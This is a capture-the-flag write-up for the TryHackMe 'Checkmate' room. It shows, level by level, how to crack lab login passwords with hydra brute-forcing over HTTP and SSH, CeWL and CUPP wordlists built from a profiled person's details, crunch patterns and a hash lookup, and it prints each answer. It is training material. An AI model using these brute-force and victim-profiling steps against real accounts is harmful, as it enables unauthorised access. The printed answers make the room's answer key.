# [TryHackMe | Checkmate](https://tryhackme.com/room/checkmate) Challenge Room Solution Writeup

Add the relevant domains before starting.

```bash
echo 'TARGET_IP thm firewall.thm jobs.thm social.thm' >> /etc/hosts
```

### What is the password for Level 1?

Visit `http://firewall.thm:5001/`, follow `inspect (Q) > Network > Reload`, then examine the `raw HTML Response` to confirm the default `username=admin`.            

```html
<input class="form-control" name="username" autocomplete="username" placeholder="admin" required>
```

Try knowningly logging in with wrong credentials to discover the error response of `Invalid credentials.`.

```html
<div class="alert alert-danger py-2 small mb-3">Invalid credentials.</div>
```

Use all of this information in `hydra` to brute-force the password. 

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt firewall.thm -s 5001 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -t 16

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://firewall.thm:5001/login:username=^USER^&password=^PASS^:Invalid credentials.
[5001][http-post-form] host: firewall.thm   login: admin   password: 12345
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at
```

Doing so discovers the login credentials of `username=admin&password=`**12345**.

### What is the password for Level 2?

Use `CeWL` to generate a wordlist of discovered keywords from `http://jobs.thm:5002`.

```bash
cewl -d 0 -m 3 --with-numbers -w words.txt http://jobs.thm:5002
```

Visit `http://jobs.thm:5002/login`, follow `inspect (Q) > Network > Reload`, then examine the `raw HTML Response` to confirm the default `username=marco`.

```html
<input class="form-control" name="username" placeholder="marco" required>
```

Try knowningly logging in with wrong credentials to discover the error response of `Invalid credentials.`.

```html
<div class="alert alert-danger py-2 small">Invalid credentials.</div>
```

Use all of this information in `hydra` to brute-force the password. 

```bash
hydra -l marco -P words.txt jobs.thm -s 5002 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -t 16

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at
[DATA] max 16 tasks per 1 server, overall 16 tasks, 94 login tries (l:1/p:94), ~6 tries per task
[DATA] attacking http-post-form://jobs.thm:5002/login:username=^USER^&password=^PASS^:Invalid credentials.
[5002][http-post-form] host: jobs.thm   login: marco   password: excellence
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at
```          

Doing so discovers the login credentials of `username=marco&password=`**excellence**.

### What is the password for Level 3?

Visit `http://social.thm:5003/login`, follow `inspect (Q) > Network > Reload`, then try knowningly logging in with wrong credentials to discover the error response of `Invalid credentials.`.

```html
<div class="alert alert-danger py-2 small">Invalid credentials.</div>
```

For this task, `CUPP` will be useful, so install it via `sudo apt install cupp`. Use Marco's profile at `http://jobs.thm:5002/profile` to find personal information with which `CUPP` may use to generate a wordlist.

```bash
cupp -i

/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence '\ '
  print("      \                     # User")
/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence '\ '
  print("       \   \033[1;31m,__,\033[1;m             # Passwords")
/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence '\ '
  print("        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler")
/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence '\ '
  print("           \033[1;31m(__)    )\ \033[1;m  ")
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Marco
> Surname: Bianchi
> Nickname: marky
> Birthdate (DDMMYYYY): 14021995


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: thm


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: IT,information,technology,operations,engineer,engineering,employee
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to marco.txt, counting 21060 words.
[+] Now load your pistolero with marco.txt and shoot! Good luck!
```

Because we don't know Marco's social media username, we could use the wordlist generated by `CUPP` for both the `username` and `password` parameters, but doing so would take a long time. First try the simple solution of `username=marco`. 

Use all of this information in `hydra` to brute-force the password. 

```bash
hydra -l marco -P marco.txt social.thm -s 5003 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -t 16

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21060 login tries (l:1/p:21060), ~1317 tries per task
[DATA] attacking http-post-form://social.thm:5003/login:username=^USER^&password=^PASS^:Invalid credentials.
[5003][http-post-form] host: social.thm   login: marco   password: Bianchi2495
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at
```

Doing so discovers the login credentials of `username=marco&password=`**Bianchi2495**.

### What is the password for Level 4?

After logging into Marco's social media, right click and save his profile photo, named `d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png`. Visit [CrackStation](https://crackstation.net/) to decode this hash as **family**.

### What is the password for Level 5?

On Marco's social media feed, a post reads "My tip for strong passsord: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark." and is tagged with "security", "excellence", "innovation", "digital", and "cloud".

Use these rules and keywords to generate password lists with `Crunch`. We could use `%%%%`, but doing so would take a long time. First try the simple solution of `20%%`.

```bash
for word in Cloud Digital Excellence Innovation Security; do crunch $((${#word}+5)) $((${#word}+5)) -t ${word}20%%! -o ${word}.txt; done && cat Cloud.txt Digital.txt Excellence.txt Innovation.txt Security.txt > strongpasswords.txt
```

Use all of this information in `hydra` to brute-force the password. 

```bash
hydra -l marco -P strongpasswords.txt thm ssh -t 16

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task
[DATA] attacking ssh://thm:22/
[STATUS] 125.00 tries/min, 125 tries in 00:01h, 376 to do in 00:04h, 15 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 185 to do in 00:02h, 15 active
[22][ssh] host: thm   login: marco   password: Security2024!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

Doing so discovers the login credentials of `username=marco&password=`**Security2024!**.